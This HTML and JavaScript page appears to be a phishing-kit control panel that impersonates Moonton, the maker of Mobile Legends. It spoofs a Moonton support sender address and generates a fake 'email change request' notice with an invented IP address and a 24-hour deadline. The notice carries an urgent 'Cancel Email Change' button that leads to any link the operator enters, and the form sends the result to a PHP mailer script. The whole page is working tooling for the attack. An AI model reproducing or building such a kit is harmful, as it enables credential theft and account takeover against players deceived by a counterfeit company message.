<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
  <title>EMAIL NOTIFICATION - MOONTON</title>
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
body {
  background: linear-gradient(135deg, #007bff 0%, #e0f0ff 100%);
  padding: 40px 20px;
  font-family: 'Poppins', sans-serif;
  color: #1a3c75;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  flex-direction: column;
}

.email-form {
  background: #ffffff;
  padding: 35px 40px;
  border-radius: 12px;
  max-width: 700px;
  width: 100%;
  box-shadow: 0 12px 40px rgba(0, 123, 255, 0.3);
  color: #1a3c75;
  margin-bottom: 40px;
}

.email-form h4 {
  font-weight: 700;
  margin-bottom: 30px;
  text-align: center;
}

input[readonly] {
  background-color: #e9ecef;
  cursor: not-allowed;
}

textarea.editor {
  border-radius: 8px !important;
  border: 1px solid #007bff !important;
  font-size: 1rem !important;
  padding: 10px !important;
  background: #fff !important;
  color: #1a3c75 !important;
  min-height: 300px;
  resize: vertical;
  width: 100%;
}

button.btn-primary {
  background: #007bff;
  border: none;
  font-weight: 600;
  padding: 12px 25px;
  font-size: 1.1rem;
  border-radius: 8px;
  color: #fff;
  margin-right: 10px;
  min-width: 150px;
  cursor: pointer;
  transition: background-color 0.3s ease;
}

button.btn-primary:hover:not(:disabled) {
  background: #0056b3;
}

#result {
  margin-top: 25px;
  font-weight: 600;
  font-size: 1.05rem;
  min-height: 30px;
  border-radius: 6px;
  padding: 12px 15px;
}

#result.success {
  color: #155724;
  background-color: #d4edda;
  border: 1px solid #c3e6cb;
}

#result.error {
  color: #721c24;
  background-color: #f8d7da;
  border: 1px solid #f5c6cb;
}

/* Responsive adjustments */
@media (max-width: 767px) {
  body {
    padding: 20px 10px;
    align-items: center;
  }

  .email-form {
    padding: 25px 20px;
    margin-bottom: 25px;
  }

  button.btn-primary {
    width: 100%;
    margin-bottom: 10px;
  }
}
  </style>
</head>
<body>

<div class="email-form">
  <h4>SEND EMAIL NOTIFICATION</h4>
  <form method="POST" autocomplete="off" id="emailForm">
    <input type="hidden" name="from_name" value="MLBB CS Team">
    <input type="hidden" name="from_email" value="donotreply@register-sc.moonton.com">

    <div class="mb-3">
      <label for="to" class="form-label">Recipient Email</label>
      <input type="email" id="to" name="to" class="form-control" placeholder="Enter recipient email" required="">
    </div>
    <div class="mb-3">
      <label for="subject" class="form-label">Subject</label>
      <input type="text" id="subject" name="subject" class="form-control" placeholder="Enter email subject" required="">
    </div>
    <div class="mb-3">
      <label for="link_target" class="form-label">Target Link</label>
      <input type="url" id="link_target" class="form-control" placeholder="Enter target link" required="">
    </div>
    <div class="mb-3">
      <label for="message" class="form-label">Message (HTML)</label>
      <textarea id="message" name="message" class="form-control editor" placeholder="Write the email message..."></textarea>
    </div>

    <div class="d-flex flex-wrap">
      <button type="submit" class="btn btn-primary">SEND</button>
      <button type="button" id="generateHtmlBtn" class="btn btn-primary ms-md-3 mt-3 mt-md-0">GENERATE CODE</button>
    </div>
  </form>

  <div id="result"></div>
</div>

<script src="js/tinymce.min.js" referrerpolicy="origin"></script>
<script>
  tinymce.init({
    selector: 'textarea.editor',
    height: 300,
    plugins: 'link lists code',
    toolbar: 'undo redo | bold italic | alignleft aligncenter alignright | bullist numlist',
    menubar: false,
    branding: false,
    content_style: "body { font-family: 'Poppins', sans-serif; font-size: 14px; color: #0d47a1; background-color: #e3f2fd; }"
  });

  function getCurrentFormattedDateTime() {
    const now = new Date();
    const pad = (n) => n.toString().padStart(2, '0');
    return `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
  }

  document.getElementById('generateHtmlBtn').addEventListener('click', () => {
    const link = document.getElementById('link_target').value.trim();

    if (!link) {
      alert('Please fill the target link first!');
      return;
    }

    const serverTime = getCurrentFormattedDateTime();
    const fixedEmail = "mobilelegendsbaru@mail.com"; // Fixed email shown in template

    const messageHTML = `
<div style="font-family:Arial,sans-serif;font-size:14px;color:#000;background-color:#fff;padding:20px;line-height:1.6">
  <p>Hello,</p>
  <p>We received a request to update the email address associated with your Moonton account to: 
     <a style="color:#1a73e8" href="mailto:${fixedEmail}" target="_blank" rel="noopener noreferrer">${fixedEmail}</a>.
  </p>
  <p><strong>Request Reason:</strong> Email Change</p>
  <p><strong>Date & Time:</strong> ${serverTime}</p>
  <p><strong>IP Address:</strong> 29.133.249.94</p>

  <p>If you did not request this change, you can cancel it:</p>

  <p style="text-align:center;margin:30px 0">
    <a style="background-color:#d93025;color:#fff;text-decoration:none;padding:10px 24px;border-radius:5px;font-weight:bold" 
       href="${link}" target="_blank" rel="noopener noreferrer">
       Cancel Email Change
    </a>
  </p>

  <p style="margin-top:20px;color:#555">
    This link is valid for 24 hours. If no action is taken, the change will proceed automatically.
  </p>

  <hr style="border:none;border-top:1px solid #ccc;margin:40px 0" />

  <p style="font-size:12px;color:#888">
    This is an automated message. If you have any questions, please contact Moonton Support.<br/>
    ï¿½ Shanghai Moonton Technology Co., Ltd.
  </p>
</div>
`.trim();

    tinymce.get('message').setContent(messageHTML);
  });

  document.getElementById('emailForm').addEventListener('submit', async function (e) {
    e.preventDefault();
    tinymce.triggerSave();

    const message = this.querySelector('textarea[name="message"]').value.trim();
    if (!message) {
      alert('Message cannot be empty.');
      return;
    }

    const btn = this.querySelector('button[type="submit"]');
    const resultDiv = document.getElementById('result');

    btn.disabled = true;
    btn.innerText = 'Sending...';
    resultDiv.textContent = '';
    resultDiv.className = '';

    const formData = new FormData(this);

    try {
      const res = await fetch('send_email.php', {
        method: 'POST',
        body: formData
      });
      const data = await res.json();

      if (data.status === 'success') {
        resultDiv.textContent = 'Email sent successfully!';
        resultDiv.className = 'success';

        this.reset();
        tinymce.get('message').setContent('');
      } else {
        resultDiv.textContent = data.message || 'Failed to send email.';
        resultDiv.className = 'error';
      }
    } catch (error) {
      resultDiv.textContent = 'Error sending email. Please try again later.';
      resultDiv.className = 'error';
    } finally {
      btn.disabled = false;
      btn.innerText = 'SEND';
    }
  });
</script>


</body></html>